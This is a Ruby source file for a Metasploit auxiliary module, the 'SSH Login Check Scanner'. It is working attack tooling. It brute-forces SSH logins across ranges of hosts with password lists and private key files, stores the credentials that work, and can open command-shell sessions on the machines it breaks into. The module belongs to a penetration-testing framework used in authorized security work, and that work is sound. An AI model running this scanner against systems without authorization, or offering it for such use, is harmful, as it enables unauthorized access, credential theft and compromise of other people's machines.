##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'net/ssh/command_stream'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/key_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::SSH::Options
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary
  include Msf::Exploit::Deprecated
  moved_from 'auxiliary/scanner/ssh/ssh_login_pubkey'

  def initialize
    super(
      'Name' => 'SSH Login Check Scanner',
      'Description' => %q{
        This module will test ssh logins on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author' => ['todb', 'RageLtMan'],
      'AKA' => ['ssh_login_pubkey'],
      'References' => [
        [ 'CVE', '1999-0502'], # Weak password
        [ 'ATT&CK', Mitre::Attack::Technique::T1021_004_SSH ]
      ],
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'VERBOSE' => false } # Disable annoying connect errors
    )

    register_options(
      [
        Opt::RPORT(22),
        OptPath.new('KEY_PATH', [false, 'Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub" will be skipped. Duplicate private keys will be ignored.']),
        OptString.new('KEY_PASS', [false, 'Passphrase for SSH private key(s)']),
        OptString.new('PRIVATE_KEY', [false, 'The string value of the private key that will be used. If you are using MSFConsole, this value should be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.'])
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),
        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def session_setup(result, scanner, used_key: false)
    return unless scanner.ssh_socket

    platform = scanner.get_platform(result.proof)

    # Create a new session
    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)

    auth_type_options = if used_key
                          {
                            'PASSWORD' => nil
                          }
                        else
                          {
                            'PASSWORD' => result.credential.private,
                            'PRIVATE_KEY' => nil,
                            'KEY_FILE' => nil
                          }
                        end

    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public
    }.merge(auth_type_options)

    s = start_session(self, nil, merge_me, false, sess.rstream, sess)
    self.sockets.delete(scanner.ssh_socket.transport.socket)

    # Set the session platform
    s.platform = platform

    # Create database host information
    host_info = { host: scanner.host }

    unless s.platform == 'unknown'
      host_info[:os_name] = s.platform
    end

    report_host(host_info)

    s
  end

  def run_host(ip)
    @ip = ip
    print_brute :ip => ip, :msg => 'Starting bruteforce'

    if datastore['USER_FILE'].blank? && datastore['USERNAME'].blank? && datastore['USERPASS_FILE'].blank?
      validation_reason = 'At least one of USER_FILE, USERPASS_FILE or USERNAME must be given'
      raise Msf::OptionValidateError.new(
        {
          'USER_FILE' => validation_reason,
          'USERNAME' => validation_reason,
          'USERPASS_FILE' => validation_reason
        }
      )
    end

    unless attempt_password_login? || attempt_pubkey_login?
      validation_reason = 'At least one of KEY_PATH, PRIVATE_KEY or PASSWORD must be given'
      raise Msf::OptionValidateError.new(
        {
          'KEY_PATH' => validation_reason,
          'PRIVATE_KEY' => validation_reason,
          'PASSWORD' => validation_reason
        }
      )
    end

    do_login_creds(ip) if attempt_password_login?
    do_login_pubkey(ip) if attempt_pubkey_login?
  end

  def do_login_creds(ip)
    print_status("#{ip}:#{rport} SSH - Testing User/Pass combinations")

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: cred_collection,
        proxies: datastore['Proxies'],
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
        skip_gather_proof: !datastore['GatherProof']
      )
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        credential_data[:private_type] = :password
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        if datastore['CreateSession']
          begin
            session_setup(result, scanner, used_key: false)
          rescue StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute :level => :error, :ip => ip, :msg => "Failed to setup the session - #{e.class} #{e.message}"
          end
        end

        if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'
          msg = "While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with"
          msg << " 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with"
          msg << " device details so it can be handled in the future."
          print_brute :level => :error, :ip => ip, :msg => msg
        end
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        invalidate_login(credential_data)
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      else
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end

  def do_login_pubkey(ip)
    print_status("#{ip}:#{rport} SSH - Testing Cleartext Keys")

    keys = Metasploit::Framework::KeyCollection.new(
      key_path: datastore['KEY_PATH'],
      password: datastore['KEY_PASS'],
      user_file: datastore['USER_FILE'],
      username: datastore['USERNAME'],
      private_key: datastore['PRIVATE_KEY']
    )

    unless keys.valid?
      print_error('Files that failed to be read:')
      keys.error_list.each do |err|
        print_line("\t- #{err}")
      end
    end

    keys = prepend_db_keys(keys)

    key_count = keys.key_data.count
    key_sources = []
    unless datastore['KEY_PATH'].blank?
      key_sources.append(datastore['KEY_PATH'])
    end

    unless datastore['PRIVATE_KEY'].blank?
      key_sources.append('PRIVATE_KEY')
    end

    print_brute level: :vstatus, ip: ip, msg: "Testing #{key_count} #{'key'.pluralize(key_count)} from #{key_sources.join(' and ')}"
    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: keys,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        proxies: datastore['Proxies'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
        skip_gather_proof: !datastore['GatherProof']
      )
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute level: :good, ip: ip, msg: "Success: '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        print_brute level: :vgood, ip: ip, msg: result.credential
        begin
          credential_core = create_credential(credential_data)
          credential_data[:core] = credential_core
          create_credential_login(credential_data)
        rescue ::StandardError => e
          print_brute level: :info, ip: ip, msg: "Failed to create credential: #{e.class} #{e}"
          print_brute level: :warn, ip: ip, msg: 'We do not currently support storing password protected SSH keys: https://github.com/rapid7/metasploit-framework/issues/20598'
        end

        if datastore['CreateSession']
          session_setup(result, scanner, used_key: true)
        end
        if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'
          msg = 'While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with'
          msg << " 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with"
          msg << ' device details so it can be handled in the future.'
          print_brute level: :error, ip: ip, msg: msg
        end
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute level: :verror, ip: ip, msg: "Could not connect: #{result.proof}"
        end
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        invalidate_login(credential_data)
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute level: :verror, ip: ip, msg: "Failed: '#{result.credential}'"
        end
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      else
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end

  def attempt_pubkey_login?
    datastore['KEY_PATH'].present? || datastore['PRIVATE_KEY'].present?
  end

  def attempt_password_login?
    datastore['PASSWORD'].present? || datastore['PASS_FILE'].present? || datastore['USERPASS_FILE'].present?
  end

end
